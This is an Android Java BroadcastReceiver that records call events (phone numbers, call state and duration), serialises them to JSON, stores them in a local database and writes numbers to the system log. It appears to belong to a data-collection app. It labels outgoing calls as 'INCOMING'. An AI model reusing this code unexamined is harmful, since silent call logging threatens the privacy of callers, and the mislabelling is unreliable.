package com.xaviar.events;

import java.util.Collection;
import java.util.LinkedList;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.xaviar.collect.calllog.CallLogEntry;
import com.xaviar.frm.DataHolder;
import com.xaviar.ui.UserData;
import com.xaviar.utils.DbUtil;

import flexjson.JSONSerializer;

public class PhoneEventReceiver extends BroadcastReceiver {
	
	
	private static final String TAG = PhoneEventReceiver.class.getSimpleName();
	private static  long start_time_ring =0;
	private static  long duration = 0;
	private static  long timeSeconds = 0;

	 @Override
	    public void onReceive(Context context, Intent intent) {
		 handleRecive(context, intent);
	 }
	
   
    private void handleRecive(Context context, Intent intent) {
        // gets an outgoing phone number
        String outgoingPhoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        Log.d(TAG,"outgoingPhoneNumber:" + outgoingPhoneNumber);
        
        // EXTRA_STATE_OFFHOOK
        Bundle bundle = intent.getExtras();
        if(null == bundle) return;        
        String state = bundle.getString(TelephonyManager.EXTRA_STATE);  
       
        // save time for start call
        if(state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_OFFHOOK))
        {
         //start_time=System.currentTimeMillis();	
         return;	
        }                
        else if(state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_RINGING))
        {
          // save start time	
          start_time_ring=System.currentTimeMillis();
          timeSeconds = System.currentTimeMillis();
          return;	
        } 
        else if(state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_IDLE))
        {
         long end_time=System.currentTimeMillis();
         duration = end_time-start_time_ring;        
        } 
        
        CallLogEntry phoneEventData = new CallLogEntry();
        phoneEventData.setDuration(String.valueOf(duration));
        String timeSecondsStr = String.valueOf(timeSeconds);
        phoneEventData.setTimeSeconds(timeSecondsStr);
        phoneEventData.setId(timeSecondsStr);
        
        phoneEventData.setPhoneNumber(outgoingPhoneNumber);
        
        if(null != outgoingPhoneNumber)
        { 
         handleOutgoingPhone(context,intent,phoneEventData);		       
        }
        else
        {
         handleIncomePhone(context,intent,phoneEventData);	
        } 
        
        save(context,phoneEventData);
    }

	private void handleOutgoingPhone(Context context, Intent intent,
			CallLogEntry phoneEventData) {
		  Log.d(TAG,"enter  handleOutgoingPhone"); 
		  phoneEventData.setType("INCOMING");		
	}

	private void save(Context ctx, CallLogEntry phoneEventData) {
		Log.d(TAG,"enter  save(..)"); 
		List<CallLogEntry> listPhone = new LinkedList<CallLogEntry>();
		listPhone.add(phoneEventData);
		String jsonText = toJsonArray(listPhone);
		
		int index1 = jsonText.indexOf("[");
		jsonText = jsonText.substring(index1+1);		
		jsonText = jsonText.substring(0, jsonText.lastIndexOf(']'));						
		Log.w(TAG,"save:jsonText:" + jsonText);
		UserData userData = new UserData();	
		userData.setText(jsonText);
		userData.setSource(DataHolder.PHONE_EVENT);
		List<UserData> userDataList = new LinkedList<UserData>();
		userDataList.add(userData);
		DbUtil.update(ctx, userDataList);			
	}

	private void handleIncomePhone(Context context, Intent intent, CallLogEntry phoneEventData) {
		  // gets an incoming phone number
		Log.d(TAG,"enter  handleIncomePhone(..)");  
        String incomingPhoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);        
        String state = "" + intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        phoneEventData.setPhoneNumber(incomingPhoneNumber);
        if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK))
        {
            // code to be executed when the phone user initiates an 
            // outgoing call or when you answer an incoming call.
        	Log.d(TAG,"state is OFFHOOK");    
        	phoneEventData.setType("OFFHOOK");
        }
        else  if (state.equals(TelephonyManager.EXTRA_STATE_IDLE))
        {
            // code to be executed when the call has ended
        	Log.d(TAG,"state is IDLE");
        	phoneEventData.setType("IDLE");
        }
        else if (state.equals(TelephonyManager.EXTRA_STATE_RINGING))
        {
            // code to be executed when the phone starts to ring        	
        	Log.d(TAG,"state is RINGING from number:" + incomingPhoneNumber);
        	phoneEventData.setType("RINGING");
        }
        else
        {
        	Log.d(TAG,"state is UNKNOWN , state:" + state);	
        	phoneEventData.setType("UNKNOWN");
        }    		
	}
	
	public static String toJsonArray(Collection<CallLogEntry> collection) {
		   return new JSONSerializer().exclude("*.class").serialize(collection);
		}	
} 